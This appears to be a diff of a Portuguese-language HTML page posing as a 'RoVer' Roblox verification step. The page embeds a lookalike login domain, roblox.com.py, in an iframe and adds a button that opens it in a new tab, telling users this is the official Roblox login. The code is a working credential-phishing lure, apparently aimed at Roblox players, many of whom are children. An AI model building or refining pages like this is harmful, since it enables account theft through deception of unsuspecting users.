@@ -3,186 +3,111 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <!-- Impede zoom estranho no mobile -->
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Verificação Roblox</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-
     * { box-sizing: border-box; }
-
     body {
-      margin: 0;
-      padding: 0;
-      background: #111111;
-      color: #ffffff;
+      margin: 0; padding: 0;
+      background: #111111; color: #ffffff;
       font-family: 'Roboto', sans-serif;
       min-height: 100vh;
       overflow-x: hidden;
     }
-
     header {
-      background: #ff3399;
-      padding: 12px 15px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      font-size: 1rem;
-      flex-wrap: wrap;
-      gap: 10px;
+      background: #ff3399; padding: 12px 15px;
+      display: flex; align-items: center; justify-content: space-between;
+      font-size: 1rem; flex-wrap: wrap; gap: 10px;
     }
-
     .logo { font-weight: bold; font-size: 1.4rem; }
-
     .menu { display: flex; gap: 15px; flex-wrap: wrap; }
-
     .menu a { color: white; text-decoration: none; font-size: 0.9rem; }
-
     .user-info { display: flex; align-items: center; gap: 8px; font-size: 0.9rem; }
-
-    .avatar {
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      background: #333;
+    .avatar { width: 28px; height: 28px; border-radius: 50%; background: #333; }
+    main { 
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      min-height: calc(100vh - 60px); text-align: center; padding: 15px;
     }
-
-    main {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: calc(100vh - 60px);
-      text-align: center;
-      padding: 15px;
-    }
-
     .content { max-width: 600px; width: 100%; }
-
     h1 { font-size: clamp(1.8rem, 6vw, 2.5rem); margin-bottom: 15px; }
-
     p { color: #aaaaaa; margin-bottom: 30px; font-size: clamp(1rem, 4vw, 1.2rem); }
-
-    .buttons {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin-bottom: 30px;
-      flex-wrap: wrap;
-    }
-
+    .buttons { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; flex-wrap: wrap; }
     .btn-primary, .btn-secondary {
-      padding: 12px 35px;
-      border-radius: 8px;
-      font-size: clamp(1rem, 4vw, 1.2rem);
-      cursor: pointer;
-      transition: 0.3s;
+      padding: 12px 35px; border-radius: 8px; font-size: clamp(1rem, 4vw, 1.2rem);
+      cursor: pointer; transition: 0.3s;
     }
-
-    .btn-primary {
-      background: #ff3399;
-      color: white;
-      border: none;
-    }
-
+    .btn-primary { background: #ff3399; color: white; border: none; }
     .btn-primary:hover { background: #ff5ab3; }
-
-    .btn-secondary {
-      background: transparent;
-      color: #ff3399;
-      border: 1px solid #ff3399;
-    }
-
+    .btn-secondary { background: transparent; color: #ff3399; border: 1px solid #ff3399; }
     .extra-link { color: #ff3399; text-decoration: none; font-size: 1rem; }
-
     .initial-content { display: block; }
-    .success-content {
-      display: none;
-      color: #00ff9d;
-      font-size: 2rem;
-      font-weight: 500;
-    }
-
+    .success-content { display: none; color: #00ff9d; font-size: 2rem; font-weight: 500; text-align: center; }
     .modal {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.95);
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-      padding: 10px;
+      display: none; position: fixed; inset: 0;
+      background: rgba(0,0,0,0.95); align-items: center; justify-content: center;
+      z-index: 1000; padding: 10px;
     }
-
     .modal.open { display: flex; }
-
     .modal-content {
-      width: 100%;
-      max-width: 900px;
-      height: 90vh;
-      max-height: 95vh;
-      background: #1e1e1e;
-      border-radius: 12px;
-      padding: 15px;
-      position: relative;
-      box-shadow: 0 0 30px rgba(255,51,153,0.3);
-      overflow: hidden;
+      width: 100%; max-width: 900px; height: 90vh; max-height: 95vh;
+      background: #1e1e1e; border-radius: 12px; padding: 15px; position: relative;
+      box-shadow: 0 0 30px rgba(255,51,153,0.3); overflow: hidden;
     }
-
     .close-btn {
-      position: absolute;
-      top: 10px;
-      right: 15px;
-      background: none;
-      border: none;
-      color: #fff;
-      font-size: 2.5rem;
-      cursor: pointer;
-      z-index: 10;
+      position: absolute; top: 10px; right: 15px; background: none; border: none;
+      color: #fff; font-size: 2.5rem; cursor: pointer; z-index: 10;
     }
-
     .verification-container {
-      width: 100%;
-      height: 100%;
-      position: relative;
-      border-radius: 8px;
-      overflow: hidden;
-      border: 1px solid #444;
-      background: #000; /* evita branco feio se iframe falhar */
+      width: 100%; height: 100%; position: relative; border-radius: 8px;
+      overflow: hidden; border: 1px solid #444; background: #000;
     }
-
     .loading-screen {
-      position: absolute;
-      inset: 0;
-      background: #1e1e1e;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: #ffffff;
-      font-size: 1.4rem;
-      z-index: 5;
+      position: absolute; inset: 0; background: #1e1e1e;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      color: #ffffff; font-size: 1.4rem; z-index: 5; text-align: center; padding: 20px;
     }
-
     iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-      background: #000;
+      width: 100%; height: 100%; border: none; background: #000;
     }
-
-    /* Mobile adjustments */
     @media (max-width: 768px) {
       header { padding: 10px; font-size: 0.9rem; }
       .modal-content { height: 95vh; border-radius: 0; padding: 10px; }
       .close-btn { font-size: 2.2rem; top: 8px; right: 12px; }
-      .buttons { flex-direction: column; }
+      .buttons { flex-direction: column; gap: 10px; }
     }
   </style>
 </head>
 <body>
-
-  <!-- Seu HTML de header e main continua igual -->
+  <header>
+    <div class="logo">RoVer</div>
+    <div class="menu">
+      <a href="#">Help</a>
+      <a href="#">Team Members</a>
+      <a href="#">Manage Servers</a>
+      <a href="#">Verification</a>
+    </div>
+    <div class="user-info">
+      <span>adundeoperacao</span>
+      <div class="avatar"></div>
+    </div>
+  </header>
+  <main>
+    <div class="content">
+      <div class="initial-content" id="initial-content">
+        <h1>Você ainda não está verificado</h1>
+        <p>Para acessar recursos exclusivos, complete a verificação de segurança Roblox.</p>
+        <div class="buttons">
+          <button class="btn-primary" id="start-verification">Iniciar Verificação</button>
+          <button class="btn-secondary">Cancelar</button>
+        </div>
+        <a href="#" class="extra-link">Precisa de ajuda com a verificação? →</a>
+      </div>
+      <div class="success-content" id="success-content">
+        <h1>Verificação concluída!</h1>
+        <p>Agora você tem acesso total ao servidor</p>
+      </div>
+    </div>
+  </main>
 
   <div class="modal" id="verification-modal">
     <div class="modal-content">
@@ -190,10 +115,11 @@
       <div class="verification-container">
         <div class="loading-screen" id="loading">
           <div>Preparando verificação<span class="loading-dots"></span></div>
-          <p style="margin-top:20px; font-size:1.1rem; color:#aaa; text-align:center; max-width:80%;">
-            Nota: O login do Roblox não carrega dentro da janela por segurança.<br>
-            Use o botão abaixo para abrir em nova aba se necessário.
+          <p style="margin-top:20px; font-size:1.1rem; color:#aaa;">
+            <strong>Importante:</strong> O site do Roblox bloqueia exibição dentro desta janela por segurança.<br>
+            A página pode aparecer em branco/cinza. Use o link abaixo se necessário.
           </p>
+          <button class="btn-primary" id="open-external" style="margin-top:20px;">Abrir login do Roblox em nova aba</button>
         </div>
         <iframe id="verify-iframe" src="about:blank" allowfullscreen></iframe>
       </div>
@@ -201,70 +127,54 @@
   </div>
 
   <script>
-    const verificationModal = document.getElementById('verification-modal');
-    const initialContent = document.getElementById('initial-content');
-    const successContent = document.getElementById('success-content');
+    const modal = document.getElementById('verification-modal');
+    const initial = document.getElementById('initial-content');
+    const success = document.getElementById('success-content');
     const startBtn = document.getElementById('start-verification');
     const closeBtn = document.getElementById('close-modal');
     const loading = document.getElementById('loading');
     const iframe = document.getElementById('verify-iframe');
+    const openExternalBtn = document.getElementById('open-external');
 
-    const IFRAME_URL = "https://roblox.com.py/login?returnUrl=3667493294562156"; // Mude se quiser testar com outro link
-
-    let isFirstLoad = true;
+    const IFRAME_URL = "https://roblox.com.py/login?returnUrl=3667493294562156"; // ou seu teste
 
     function completeVerification() {
-      verificationModal.classList.remove('open');
-      initialContent.style.display = 'none';
-      successContent.style.display = 'block';
+      modal.classList.remove('open');
+      initial.style.display = 'none';
+      success.style.display = 'block';
     }
 
-    function closeModalManually() {
-      verificationModal.classList.remove('open');
-      iframe.src = "about:blank"; // Limpa para evitar cache
-    }
-
-    function checkForRobloxDomain() {
-      if (isFirstLoad) {
-        isFirstLoad = false;
-        return;
-      }
-
-      try {
-        const url = iframe.contentWindow.location.href.toLowerCase();
-        if (url.includes("roblox.com")) {
-          loading.innerHTML = '<div>Verificando<span class="loading-dots"></span></div>';
-          setTimeout(completeVerification, 2800);
-        }
-      } catch (e) {
-        // Erro cross-origin = mais provável que logou (método mais usado)
-        loading.innerHTML = '<div>Verificando<span class="loading-dots"></span></div>';
-        setTimeout(completeVerification, 3200);
-      }
+    function closeModal() {
+      modal.classList.remove('open');
+      iframe.src = "about:blank";
     }
 
     startBtn.onclick = () => {
-      isFirstLoad = true;
-      verificationModal.classList.add('open');
-
+      modal.classList.add('open');
       loading.style.display = 'flex';
-      iframe.style.display = 'none'; // Começa escondido
+      iframe.style.display = 'none';
       iframe.src = IFRAME_URL;
 
-      iframe.onload = () => {
-        setTimeout(() => {
-          loading.style.display = 'none';
-          iframe.style.display = 'block';
-        }, 1500);
-      };
+      setTimeout(() => {
+        loading.style.display = 'none';
+        iframe.style.display = 'block';
+      }, 2000);
     };
 
-    iframe.addEventListener('load', checkForRobloxDomain);
-
-    closeBtn.onclick = closeModalManually;
-    verificationModal.onclick = (e) => {
-      if (e.target === verificationModal) closeModalManually();
+    openExternalBtn.onclick = () => {
+      window.open(IFRAME_URL, '_blank');
     };
+
+    closeBtn.onclick = closeModal;
+    modal.onclick = (e) => { if (e.target === modal) closeModal(); };
+
+    // Se quiser "confirmar" manualmente, pode adicionar um botão extra no loading:
+    // const confirmManual = document.createElement('button');
+    // confirmManual.textContent = 'Já fiz o login → Finalizar';
+    // confirmManual.className = 'btn-primary';
+    // confirmManual.style.marginTop = '20px';
+    // confirmManual.onclick = completeVerification;
+    // loading.appendChild(confirmManual); // descomente se quiser
   </script>
 </body>
 </html>
